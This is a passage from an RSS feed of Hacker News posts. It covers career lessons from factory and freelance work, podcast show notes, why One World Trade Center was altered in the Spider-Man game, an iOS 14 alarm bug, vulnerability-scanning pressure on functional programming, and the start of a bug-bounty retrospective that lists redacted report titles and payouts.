<p><strong>THE FISH FACTORY</strong> processed 300 t pelagic fish daily, with intake from the boat dependent on work done in sequence by 50 people. Most packing 20kg boxes, some driving a <a href="https://elisabethirgens.github.io/notes/2017/11/fish/">fork lift truck or operating a fillet machine</a>. The elevator moved pallets frozen the previous day, and it was such a critical bottle neck that one person was assigned elevator duty to avoid prolonged stops.</p>

<p>I learnt how constraints affect the system as a whole. If the elevator or any other part of the system was too slow, the entire production would grind to a halt. You truly grasp the concept of <strong>work flow</strong> when it is physical. Boxes clogging the conveyor belts, pallets queueing up with no floor space, lines of people literally just having to wait because their work stations are blocked from progress.</p>

<hr>

<h3 id="influencing-decisions-">Influencing decisions 💥</h3>

<p><strong>UNIONS</strong> are valuable and I was a pissed-off 21 year old elected representative, capable of reading and utilizing the labour laws better than company management. Fun times. Buy me a beer and I&nbsp;can tell you the story of when I intentionally got myself fired to dispute illegal work contracts.</p>

<p>I learnt that organisations consist of people and decisions do not materialize out of thin air. You can often impact more than you think, even if you feel like you have no say at all. Companies can have the most rigid power structures in place, and it is still possible to push, prod, nudge, plant ideas.</p>

<hr>

<h3 id="computers-are-not-magic-">Computers are not magic 💻</h3>

<p><strong>OIL INDUSTRY PROCUREMENT</strong> stood for a handful of temp office jobs over the years. I quickly picked up how to use Office programs and found my way around ERP systems, which landed me these gigs as a person who could use whatever software without the courses upfront.</p>

<p>I learnt that I am apparently “good with computers”.</p>

<hr>

<h3 id="improving-daily-work-">Improving daily work 🛠</h3>

<p><strong>THE BOAT ENGINE FACTORY</strong> provided steady work all year round, unlike the fish factory. Workers were still typically considered interchangeable units, especially in the warehouse functions, but there was variety and autonomy — which meant we excelled in creating routines and optimization hacks.</p>

<p>I learnt how being lazy is a fantastic trait that motivates improvements. Faster, so we could have longer coffee breaks. Easier, so we could think about other things than the tedious. More resilient, because getting packages in return with missing or broken spare parts was boring repeat work.</p>

<hr>

<h3 id="limitations-are-my-jam-">Limitations are my jam ⏳</h3>

<p><strong>DESIGN AGENCY</strong> for 4 years, everything from print to HTML/CSS for static sites. A lot of designers enjoy working in a limitless realm for as long as possible, before they are forced to reign it in. They tried to teach this approach to creativity when I studied graphic design, but I revel in the realistic.</p>

<p>I learnt to prefer discovering the limits early, then proceeding to be creative within those. I&nbsp;don’t get thrilled about what we could <em>potentially</em> do with unlimited time and twice the number of people. I&nbsp;genuinely get most excited by what we can do here and now with the resources we have.</p>

<hr>

<h3 id="effectively-involving-stakeholders-">Effectively involving stakeholders 💬</h3>

<p><strong>RUNNING A BUSINESS</strong> as a freelance frontender for 7 years. When building custom websites at fixed project prices, it was essential to know exactly how to keep clients in the loop. Working in solitude, attempting to solve all the problems before a big reveal, would have been a terrible approach.</p>

<p>I learnt the value of showing work in progress. I got the hang of asking the right questions, and setting up a process that allowed me to get direction along the way. To this day, I don’t try to impress with my suggestions — instead I bring others along and utilize transparency while work in iterations.</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://elisabethirgens.github.io/notes/2020/09/to-all-jobs-i-had-before/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24502983</guid>
            <pubDate>Thu, 17 Sep 2020 10:37:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Become an Ultralearner – Scott H. Young on the Artists of Data Science Podcast]]>
            </title>
            <description>
<![CDATA[
Score 36 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24502962">thread link</a>) | @harpreetsahota
<br/>
September 17, 2020 | https://theartistsofdatascience.fireside.fm/scott-h-young | <a href="https://web.archive.org/web/*/https://theartistsofdatascience.fireside.fm/scott-h-young">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    

    <p>Scott H Young a writer, programmer, traveler and avid reader of interesting things. For the last ten years he's been experimenting to find out how to learn and think better. Today he swings by the show and talks to us about how we can master hard skills faster!</p>

<p><strong>QUOTES</strong><br>
"What you need is not just motivation, but you need some kind of system. You need some way to channel that initial burst of enthusiasm into creating structures for your life so that you will kind of consistently re-engage with it and consistently do what you need to do to learn things better." [00:07:37] </p>

<p>"The way that mental models become useful is when you really spent a lot of time thinking about them, not when you just heard their name and kind of written them down and understood a few sentences." [00:13:54] </p>

<p>"There is a certain type of person, I guess you could say that like they do need to stop reading, they need to actually start just taking action on things and implementing things." [00:24:23] </p>

<p>"The possibilities of learning are a lot more vast than you've maybe previously considered." [01:02:17]</p>

<p><strong>CONNECT WITH SCOTT</strong><br>
Website: <a href="https://www.scotthyoung.com/" rel="nofollow">https://www.scotthyoung.com/</a></p>

<p>Twitter: <a href="https://twitter.com/scotthyoung/" rel="nofollow">https://twitter.com/scotthyoung/</a></p>

<p>Facebook: <a href="https://www.facebook.com/AuthorScottYoung/" rel="nofollow">https://www.facebook.com/AuthorScottYoung/</a></p>

<p><strong>SHOW NOTES</strong></p>

<p>[00:01:27] Introduction for our guest</p>

<p>[00:02:42] Talk to us a bit about your journey. How did you get to where you are today?</p>

<p>[00:03:30] The struggles on the path to becoming an ultralearner</p>

<p>[00:06:22] The pitfalls of motivation</p>

<p>[00:08:25] A walk down the narrow path to success</p>

<p>[00:10:47] How to make sure you’re applying effort intelligently</p>

<p>[00:13:18] The benefits and limits of mental models</p>

<p>[00:16:32] The difference between knowing the name of a thing and knowing the thing</p>

<p>[00:18:54] Scott’s favorite mental model</p>

<p>[00:21:05] Scott talks about his doodles</p>

<p>[00:23:33] Is reading making you stupid?</p>

<p>[00:26:23] The danger of learning theories and not applying them</p>

<p>[00:27:37] You need to do more than just homework</p>

<p>[00:29:27] What to do when you’re stunned into inaction</p>

<p>[00:31:39] You can’t see your brain getting buff</p>

<p>[00:33:36] Luck to destiny</p>

<p>[00:39:14] What exactly is ultralearning?</p>

<p>[00:40:27] How can we use ultralearning to accelerate, transition, or rescue our careers?</p>

<p>[00:41:46] Why is it that we procrastinate?</p>

<p>[00:42:55] Mental habits to combat procrastination</p>

<p>[00:45:40] You’re more ready than you think you are</p>

<p>[00:49:32] How can we mitigate the distraction of our mind?</p>

<p>[00:51:18] Do you have any tips for our listeners for what they could start doing today to improve the quality of their focus?</p>

<p>[00:53:27] The principle of intuition</p>

<p>[00:59:47] Building expert intuition</p>

<p>[01:02:04] What's the one thing you want people to learn from your story?</p>

<p>[01:03:25] The random round</p>




      
      
  </div></div>]]>
            </description>
            <link>https://theartistsofdatascience.fireside.fm/scott-h-young</link>
            <guid isPermaLink="false">hacker-news-small-sites-24502962</guid>
            <pubDate>Thu, 17 Sep 2020 10:34:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sixty second stories of exceptional founders, sent out every 10 days]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24502932">thread link</a>) | @plincoln8
<br/>
September 17, 2020 | http://tareksway.com/visionaries | <a href="https://web.archive.org/web/*/http://tareksway.com/visionaries">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://tareksway.com/visionaries</link>
            <guid isPermaLink="false">hacker-news-small-sites-24502932</guid>
            <pubDate>Thu, 17 Sep 2020 10:28:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Is 1 World Trade Center Missing from Spider-Man?]]>
            </title>
            <description>
<![CDATA[
Score 173 | Comments 116 (<a href="https://news.ycombinator.com/item?id=24502706">thread link</a>) | @tosh
<br/>
September 17, 2020 | https://www.stevenbuccini.com/why-1wtc-isnt-in-spiderman | <a href="https://web.archive.org/web/*/https://www.stevenbuccini.com/why-1wtc-isnt-in-spiderman">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Like many people across the world, I’m using my quarantine effectively: by catching up on all the video games I wasn’t able to play while traveling. The game at the top of my list? <a href="https://en.wikipedia.org/wiki/Spider-Man_(2018_video_game)">Spider-Man</a>, which was widely recognized as one of the top games of 2018. The game is features an open-world, which means you can travel around the game map as you see fit. And since Spider-Man, canonically, lives in real-life New York City, this means you’ll spend hours webbing around an incredibly detailed version of the city that never sleeps.</p>

<p>If you’ve spent any appreciable amount of time in New York, the in-game world will immediately feel familiar. The developers nailed the look and feel of the city. I found myself using real-world landmarks to orient myself as I slinged (slunged?) across Manhattan. The game leans into this realism—it even includes a challenge where you can take photos of in-game landmarks. While some are unique to the Marvel universe, like Avengers Tower and Uncle Ben’s grave, many exist in the real world and are faithfully reproduced within the game: Williamsburg/Brooklyn/Manhattan/Queensboro Bridges all make an appearance, as does Grand Central, Madison Square Garden, Saint Patrick’s Cathedral, Columbus Circle, the High Line and many more points of reference. As you’re swinging through the city, you’re treated to great views of Manhattan’s skyline, anchored by the Empire State Building, Chrysler Building, and Freedom Tower. Except, it’s <em>not</em> the Freedom Tower, despite being located in the exact same location as its real-life counterpart. Why are equally famous buildings like the Empire State Building accurately depicted, but the Freedom Tower isn’t?</p>

<p>Here’s what the “Freedom Tower” looks like in the game:
<img src="https://www.stevenbuccini.com/assets/spiderman/spiderman-1wtc.png" alt="In-Game 1WTC">
<em>(credit to Polygon because I was too lazy to get this off my PS4 myself)</em></p>

<p>Interestingly enough, the in-game design looks to be based on Libeskind’s original design for Freedom Tower (an interesting recap of the changes can be found <a href="https://www.newyorker.com/business/currency/daniel-libeskinds-world-trade-center-change-of-heart">here</a>), lending further credence to the theory that this building is supposed to be 1WTC.</p>

<p>My curiosity was further piqued when I learned that the <em>real</em> One World Trade Center was actually in the game during a demo at E3 in June of 2018, less than 4 months before the final game was set to be released to the public!</p>

<p><img src="https://www.stevenbuccini.com/assets/spiderman/1wtc_e3.png" alt="Real-life 1WTC in Spider-Man demo from E3 2018"></p>

<p>This deadline is even closer than it appears at first glance as the <a href="https://en.wikipedia.org/wiki/Software_release_life_cycle#RTM">“gold master”</a> is finalized weeks before release date so manufacturers have time to make and distribute the game to retailers. This change must have been implemented at the 11th hour.</p>

<p>And even after swapping the model out, they featured the building prominently on the home screen in the released version of the video game!
<img src="https://www.stevenbuccini.com/assets/spiderman/spiderman-start.png" alt="Start screen">
<em>(<a href="https://www.noobfeed.com/features/1119/marvel-s-spider-man-how-do-you-access-new-game-plus-and-ultimate-difficulty">credit</a>)</em></p>

<p>So <em>why</em> isn’t the real-life 1 WTC featured? At this point, we can eliminate time and budget constraints because we know the model already existed and was implemented before launch. We know that the designers thought this building was important as it’s the first thing you notice when starting the game.</p>

<p>I wish to briefly introduce <strong>Buccini’s razor</strong>—if something fun disappears unexpectedly, the cause is litigation (real or imagined).</p>

<p>It turns out that just like an author can copyright their book and a musician can copyright a song, an architect can copyright a building. Sure enough, here’s the copyright record for One World Trade Center:
<img src="https://www.stevenbuccini.com/assets/spiderman/copyright_record.png" alt="Record from [copyright.gov](https://www.copyright.gov/); can't deeplink the record but you can find it yourself by using the document record seen above"></p>

<p>At this point, I had a strong feeling copyright law was the reason for the change. The <a href="https://www.reddit.com/r/SpidermanPS4/comments/9grnr8/freedom_tower/">internet</a> <a href="https://www.reddit.com/r/SpidermanPS4/comments/9d3paw/the_real_reason_for_the_redesigned_freedom_tower/">seems</a> <a href="https://gamefaqs.gamespot.com/boards/191635-marvels-spider-man/76988485">to</a> <a href="https://www.neogaf.com/threads/one-world-trade-center-has-been-removed-from-spider-man-ps4.1465315/">agree</a>.</p>

<p>As luck<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> would have it, there was <a href="https://www.nexsenpruet.com/professionals/jeff-reichard">an expert in architectural copyright</a> right around the corner from my house here in Greensboro! Jeffrey was kind enough to spend a few minutes of his time thinking about this not-at-all-important question.</p>

<p>First, Jeffrey noted that <em>copyrights expire</em>. Just as music and books can pass into the public domain for anyone to replicate freely, you can also build an exact replica of the Empire State Building here in the United States if you so choose. Generally, any building constructed after December 1, 1990 is covered by the <a href="https://www.djc.com/news/ae/11151054.html">Architectural Works Copyright Protection Act</a>. This would explain why older structures are replicated faithfully but the Freedom Tower is not.</p>

<p>However, this doesn’t tell the full story. As Jeffrey noted, <a href="https://www.law.cornell.edu/uscode/text/17/120">17 U.S. Code § 120(a)</a> “provides an exception related to pictorial representations of of buildings that are visible from a public place. Therefore, I am not sure exactly why they changed it in the video game.”</p>

<p>The final piece of the puzzle lies at the <a href="https://www.youtube.com/watch?v=vo5A_fuDgtk&amp;feature=youtu.be&amp;t=2666">end of the credits</a>, where the creators of the game specifically thank the owners of certain famous buildings in New York, including the Empire State Building. I found this curious as the Empire State Building should be doubly safe: it was constructed long before 1990 so it is not covered under copyright law, and it is visible from a public place so it should be exempt from any potential copyrights. But look closer. You’ll see that they are acknowledging the <em>trademark</em> holders, NOT the <em>copyright</em> holders.</p>

<p><a href="https://www.photosecrets.com/buildings-copyright-and-trademarks">As this page</a> helpfully explains, applying a trademark to the building limits how the building’s image can be used in the sale of goods and services (like video games)! The credits hint that the video game creators obtained limited licenses to use the trademark, i.e. the distinctive design and appearance of the building, for certain buildings such as the Flatiron Building.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></p>

<p>Therefore, the most likely answer is that the distinctive shape of 1 World Trade Center is either trademarked (although I could not find it within USPTO databases) or is so recognizable that it is easily defensible via a common law trademark and the game developers were unable to secure a license to use the trademark before their deadline.</p>

<p>However, <a href="https://www.youtube.com/watch?v=gHzuHo80U2M">Sony just announced</a> an expansion to the Spider-Man video game, so perhaps the additional time and the demonstrated popularity of the first installment will help resolve this issue for the upcoming title.</p>



  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://www.stevenbuccini.com/why-1wtc-isnt-in-spiderman</link>
            <guid isPermaLink="false">hacker-news-small-sites-24502706</guid>
            <pubDate>Thu, 17 Sep 2020 09:38:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I overslept because iOS 14 disabled my alarm]]>
            </title>
            <description>
<![CDATA[
Score 485 | Comments 313 (<a href="https://news.ycombinator.com/item?id=24502697">thread link</a>) | @dewey
<br/>
September 17, 2020 | https://annoying.technology/posts/e82ff3bde8b225e6/ | <a href="https://web.archive.org/web/*/https://annoying.technology/posts/e82ff3bde8b225e6/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://d33wubrfki0l68.cloudfront.net/9261d105b12f5c6c5928c9532d1f8721b84005cd/62d1b/media/oversleeping.jpg"></p><p>I’m using the iOS <a href="https://support.apple.com/en-us/HT208655">Bedtime</a> feature for years now. With yesterday’s iOS 14 update the feature got moved from the Clock app to the Health app. Unfortunately the migration is done by disabling your existing alarm and showing a button to open the Health app to set it up again.</p><p>I woke up late and well rested today.</p></div></div>]]>
            </description>
            <link>https://annoying.technology/posts/e82ff3bde8b225e6/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24502697</guid>
            <pubDate>Thu, 17 Sep 2020 09:36:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Infosec Apocalypse]]>
            </title>
            <description>
<![CDATA[
Score 155 | Comments 99 (<a href="https://news.ycombinator.com/item?id=24501803">thread link</a>) | @chillax
<br/>
September 16, 2020 | https://blog.rickasaurus.com/2020/08/31/The-Infosec-Apocalypse.html | <a href="https://web.archive.org/web/*/https://blog.rickasaurus.com/2020/08/31/The-Infosec-Apocalypse.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>The rise of tooling for vulnerability detection combined with pressure driven by Vendor Due Diligence is causing a massive enterprise freezeout for non-mainstream technologies across the board. Of particular concern is the impact this will have on the adoption of functional programming in enterprise and small business B2B development.</p>

<p>I see now that the last 10 years were “easy mode” for the growth of new programming tools and infrastructure, with many new breakthrough technologies seeing rapid adoption. Languages like Node, Go and to some degree Scala saw breakaway success, not to mention all of the new cloud tech, NoSQL tech, containerization and data processing platforms along with their custom query DSLs. Other languages like Haskell saw success in small companies and skunkworks style teams solving very difficult problems.</p>

<h3 id="the-rise-of-vulnerability-scanning">The Rise of Vulnerability Scanning</h3>

<p>Just this past year I’ve come to see we’re in the middle of a massive change across the industry. There are new forces at play which will calcify current software stacks and make it extremely hard for existing or new entrants to see similar success without a massive coordinated push backed by big enterprise companies. This force is the rise of InfoSec and vulnerability detection tooling.</p>

<p>Tools like <a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">Blackduck, WhiteSource, Checkmarx, Veracode</a> are exploding in popularity, there are too many to list and many variations on the same theme. In the wake of so many data leaks and hacking events enterprises no longer trust their developers and SREs to take care of security, and so protocols are being implemented top down. This isn’t just on the code scanning side, there is a similar set of things going on with network scanning as well which impacts programming languages less, but similarly will calcify server stacks.</p>

<p>These tools are quickly making their way into SOC2 and SDLC policies across industry, and if your language or new infrastructure tool isn’t supported by them there’s little chance you will get the previously already tenuous approval to use them. This sets the already high bar for adoption much higher. As you might expect, vendors will only implement support for languages that meet some threshold for profitability of their tools. Not only do you need to build a modern set of tools for your language to compete, now you also need support from external vendors.</p>

<h3 id="vendor-due-diligence">Vendor Due Diligence</h3>

<p>Maybe we just cede this territory to enterprise tools with big backers like Microsoft and Oracle, we never more than a few small inroads anyway. The use of these tools is arguably a good thing overall for software security. Unfortunately, the problem cannot be sidestepped so easily, and I’m afraid this is where things look very bleak. The biggest new trend is in enforcement of these tools through Vendor Due Diligence.</p>

<p>You may not be familiar with Vendor Due Diligence if you aren’t in a manager role. The basic idea is your customer will send you a long list of technical questions about your product which you must fill out to their satisfaction before they buy your product or service. In the B2B space where I work these lists are nothing new, but have been getting longer and longer over the last 10 years, now often numbering in the hundreds of questions.</p>

<p>Most recently I’ve seen more and more invasive questions being asked, some even going into how teams are organized, but important to this article is that across the board they now all ask about vulnerability scanning and now often request specific outputs for well-known vulnerability scanning tools. The implication being that if you’re not scanning with these tools they won’t buy your software, and the list of supported languages is small.</p>

<p>Any experienced technology manager sees the natural tradeoff here. When it comes down to making money versus using cool tech, cool tech will lose every time. You’re just burning money if you’re building cool things with cool tech if you know no one will buy it.</p>

<h3 id="so-what-now">So What Now?</h3>

<p>Potentially we will see a resurgence of “compile-to” functional programming with mainstream language targets to sidestep the issue. I suppose though that the extra build complexity and problems debugging will prevent this from ever being mainstream, not to mention that the vulnerability tools look for specific patterns and likely won’t behave well on generated code.</p>

<p>There is some hope in the form of projects like SonarCube which enables users to come together and <a href="https://github.com/SonarSource/sonar-custom-plugin-example">build custom plugins</a>. Will functional programming communities come together to build and maintain such boring tech? I somewhat doubt it. This kind of work is not what most programmers would choose to do in their off time. Similarly, vulnerability detection is unlikely to be a good target to be advanced a little at a time with academic papers. It would take true functional programming fanatics to build companies or tools dedicated to the cause. If you are interested in helping out, pay attention to the <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> as this list drives focus for many infosec teams.</p>

<p>Where does this leave us? If our communities do nothing then smaller B2B software operations focused mom and pop shops or consumer focused web applications likely won’t see any impact unless static analysis makes it into data protection law. Beyond these use cases FP will be relegated to tiny boxes on the back end where vulnerabilities are much less of a concern and the mathematical skills of functional programmers can bring extreme amounts of value.</p>

<p>I know there are many deeper facets I didn’t cover here, if you want to continue the discussion <a href="https://twitter.com/rickasaurus/status/1300487826782420995">join the thread on twitter</a>.</p>


  </div></div>]]>
            </description>
            <link>https://blog.rickasaurus.com/2020/08/31/The-Infosec-Apocalypse.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24501803</guid>
            <pubDate>Thu, 17 Sep 2020 06:34:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacking on Bug Bounties for Four Years]]>
            </title>
            <description>
<![CDATA[
Score 86 | Comments 9 (<a href="https://news.ycombinator.com/item?id=24500198">thread link</a>) | @infosecau
<br/>
September 16, 2020 | https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/ | <a href="https://web.archive.org/web/*/https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <ul>
  <li><a href="https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/#intro">Intro &amp; Motivations</a></li>
  <li><a href="https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/#findings">Findings</a></li>
  <li><a href="https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/#analysis">Analysis</a></li>
  <li><a href="https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/#collaboration">Collaboration</a></li>
  <li><a href="https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/#methodology">Methodology</a></li>
</ul>

<hr>





<p>I value transparency a lot, especially when it comes to the bug bounty space. Bug bounty hunters all around the world are submitting a range of reports where the issues found span across multiple domains, often leveraging numerous techniques and methodologies. However, if you’re not already an active bug bounty hunter who has a good understanding of what a bounty program expects, or will pay out for, you have a major disadvantage compared to someone who does have this knowledge. I hope through this blog post, I can demystify the sort of issues bug bounty programs pay for.</p>

<p>The last blog post I did in this series was around four years ago, <a href="https://shubs.io/high-frequency-security-bug-hunting-120-days-120-bugs/">120 days, 120 bugs</a>. In the last four years, a lot has happened. I moved to Europe for six months, I moved interstate in Australia twice, I won a <a href="https://www.youtube.com/watch?v=VojwIY4GL-4">live hacking event</a>, I co-founded a company and helped build an <a href="https://assetnote.io/">attack surface management platform</a> with a team of people I consider family.</p>

<p>Unlike my previous blog post, I did not set myself a goal to find a bug a day. Instead, I participated in bug bounties whenever time allowed. There were many months where I found nothing at all, which often terrified me when it came to evaluating my self worth as a hacker. I also admitted to myself, that I might be a good hacker, but there is always going to be a better hacker out there, and I’ve made my peace with that as a hyper-competitve person.</p>

<p>If you don’t have an excellent understanding of fundamental application security <a href="http://projects.webappsec.org/w/page/13246978/Threat%20Classification">attacks and weaknesses</a> before you approach bug bounties, in my opinion, you are wasting your time. <a href="https://portswigger.net/web-security">Practice and learn more here</a>.</p>

<p>If you’re looking for a paid, more extensive resource, check out and practice with <a href="https://pentesterlab.com/">PentesterLab</a>.</p>

<p>Participating so heavily in bug bounties has given us the knowledge at Assetnote about what security teams <em>actually</em> care about. It’s the reason we can maintain high signal when we are continuously finding exposures.</p>

<p>My primary motivation for this blog post is to educate the masses on what bug bounty programs are paying out for.</p>

<p>For example, would you know that you could submit a dangling EC2 IP (subdomain pointing to an EC2 IP that is no longer owned by the company) as a bug report without reading the proof in the pudding below? I’ve been paid for this by programs, so clearly they value this sort of information.</p>

<hr>




<p>Below are all of my findings for the last four years. I’ve redacted information where necessary, but by reading the titles, it should give you a good understanding of what I was reporting to programs.</p>

<table data-order="[[ 0, &quot;desc&quot; ]]" id="bugs">
<thead><tr><th title="Field #1">Date</th>
<th title="Field #2">Bug</th>
<th title="Field #3">Payout</th>
</tr></thead>
<tbody><tr>
<td>2020-09-02 14:04:11 UTC</td>
<td>[redacted] Hosted Zone Takeover</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2020-07-16 18:39:22 UTC</td>
<td>Spring debugging endpoints exposed leading to disclosure of all secrets via heapdump on [redacted] &amp; Account takeover by Trace</td>
<td>$2,500.00</td>
</tr>
<tr>
<td>2020-06-30 22:54:07 UTC</td>
<td>Blind SSRF on [redacted] through invoicing API - access to internal hosts</td>
<td>$60.00</td>
</tr>
<tr>
<td>2020-06-10 13:53:43 UTC</td>
<td>Full Account takeover through subdomain takeover via [redacted]</td>
<td>$300.00</td>
</tr>
<tr>
<td>2020-06-10 13:24:10 UTC</td>
<td>Full Account takeover through subdomain takeover via [redacted]</td>
<td>$300.00</td>
</tr>
<tr>
<td>2020-06-10 13:21:57 UTC</td>
<td>Full Account takeover through subdomain takeover via  [redacted]</td>
<td>$300.00</td>
</tr>
<tr>
<td>2020-06-08 14:28:05 UTC</td>
<td>Amazon S3 Subdomain Hijack - [redacted]</td>
<td>$256.00</td>
</tr>
<tr>
<td>2020-06-08 05:29:58 UTC</td>
<td>Route53 Hosted Zone Takeover of [redacted]</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-06-05 16:27:42 UTC</td>
<td>Admin panel for Cisco IP Conference Station CP-7937G exposed on the internet on [redacted] IP ranges</td>
<td>$400.00</td>
</tr>
<tr>
<td>2020-06-03 21:07:51 UTC</td>
<td>Pre-auth Blind MSSQL Injection affecting [redacted]</td>
<td>$1,024.00</td>
</tr>
<tr>
<td>2020-06-03 14:18:24 UTC</td>
<td>Pre-auth MSSQL Injection affecting [redacted]</td>
<td>$1,024.00</td>
</tr>
<tr>
<td>2020-06-02 15:28:50 UTC</td>
<td>Pre-auth SQL Injection affecting [redacted]</td>
<td>$1,024.00</td>
</tr>
<tr>
<td>2020-06-02 15:26:58 UTC</td>
<td>RCE via arbitrary file write and path traversal [redacted]</td>
<td>$1,024.00</td>
</tr>
<tr>
<td>2020-06-02 15:25:08 UTC</td>
<td>RCE via arbitrary file write and path traversal [redacted]</td>
<td>$1,024.00</td>
</tr>
<tr>
<td>2020-05-18 10:12:38 UTC</td>
<td>Route53 Hosted Zone Takeover of [redacted]</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2020-05-18 10:11:58 UTC</td>
<td>Route53 Hosted Zone Takeover of [redacted]</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2020-05-18 10:06:22 UTC</td>
<td>Route53 Hosted Zone Takeover of [redacted]</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2020-05-18 10:05:20 UTC</td>
<td>Route53 Hosted Zone Takeover of [redacted]</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2020-05-11 18:47:54 UTC</td>
<td>Route53 Hosted Zone Takeover of [redacted]</td>
<td>$100.00</td>
</tr>
<tr>
<td>2020-05-11 14:59:23 UTC</td>
<td>Account takeover through Subdomain Takeover of [redacted] (Cookie Disclosure -&gt; Account Takeover)</td>
<td>$2,500.00</td>
</tr>
<tr>
<td>2020-05-11 14:31:18 UTC</td>
<td>Account takeover through Subdomain Takeover of [redacted] (Cookie Disclosure -&gt; Account Takeover)</td>
<td>$2,500.00</td>
</tr>
<tr>
<td>2020-05-07 01:47:49 UTC</td>
<td>View all metadata for any [redacted] IDOR [redacted]</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2020-04-29 22:58:57 UTC</td>
<td>IDOR view all [redacted]</td>
<td>$4,000.00</td>
</tr>
<tr>
<td>2020-04-29 22:57:55 UTC</td>
<td>IDOR view the [redacted]</td>
<td>$2,500.00</td>
</tr>
<tr>
<td>2020-04-24 18:19:23 UTC</td>
<td>Subdomain takeover of [redacted] through Heroku</td>
<td>$300.00</td>
</tr>
<tr>
<td>2020-04-24 18:18:45 UTC</td>
<td>Subdomain takeover of [redacted] through Heroku</td>
<td>$300.00</td>
</tr>
<tr>
<td>2020-04-23 19:45:04 UTC</td>
<td>Ability to horizontal bruteforce [redacted] accounts by abusing [redacted] sign up flow</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-04-22 17:44:29 UTC</td>
<td>View all metadata for any [redacted] IDOR [redacted]</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-04-22 17:42:51 UTC</td>
<td>IDOR view the [redacted] for any [redacted] for today [redacted]</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-04-22 17:42:06 UTC</td>
<td>IDOR view all [redacted] for a [redacted] [redacted]</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-04-06 19:13:19 UTC</td>
<td>Facebook - Payout For [redacted]</td>
<td>$5,000.00</td>
</tr>
<tr>
<td>2020-03-07 15:12:24 UTC</td>
<td>Accessing Querybuilder on [redacted] to gain access to secrets</td>
<td>$3,000.00</td>
</tr>
<tr>
<td>2020-02-25 15:02:20 UTC</td>
<td>Subdomain takeover of [redacted] via Amazon S3</td>
<td>$750.00</td>
</tr>
<tr>
<td>2020-02-20 23:01:58 UTC</td>
<td>HTML injection, DOS of email receipts and potentially template injection within [redacted] via "Expense Info" section</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-02-18 14:45:40 UTC</td>
<td>Admin account bruteforce via [redacted]/libs/granite/core/content/login.html</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-02-15 12:24:57 UTC</td>
<td>Blind XSS via registering on [redacted]</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-02-04 03:45:38 UTC</td>
<td>HTML Injection in email when contributing to a [redacted]</td>
<td>$700.00</td>
</tr>
<tr>
<td>2020-01-21 17:13:58 UTC</td>
<td>Ability to attach malicious attachments (of any name and of any content type) to [redacted] support staff via [redacted]</td>
<td>$2,000.00</td>
</tr>
<tr>
<td>2020-01-15 11:41:59 UTC</td>
<td>No authentication required to view and delete Terraform locks at [redacted]</td>
<td>$250.00</td>
</tr>
<tr>
<td>2019-12-12 16:25:11 UTC</td>
<td>[redacted] Webhook URL + object leaked in JavaScript on [redacted]</td>
<td>$3,000.00</td>
</tr>
<tr>
<td>2019-11-21 22:15:20 UTC</td>
<td>AWS &amp; Screenhero JWT Credentials from [redacted] not rotated, still working</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2019-10-17 13:44:23 UTC</td>
<td>RCE on [redacted] via IBM Aspera exploit leading to compromise of secure file storage </td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2019-10-15 14:29:25 UTC</td>
<td>SSO bypass on [redacted] leading to access of internal documents and portals</td>
<td>$250.00</td>
</tr>
<tr>
<td>2019-10-11 18:07:51 UTC</td>
<td>Admin access to [redacted] via guessing credentials</td>
<td>$1,500.00</td>
</tr>
<tr>
<td>2019-10-11 18:06:15 UTC</td>
<td>3rd party subdomain hijack - EC2 IP of [redacted] is no longer controlled by [redacted]</td>
<td>$250.00</td>
</tr>
<tr>
<td>2019-09-30 16:56:50 UTC</td>
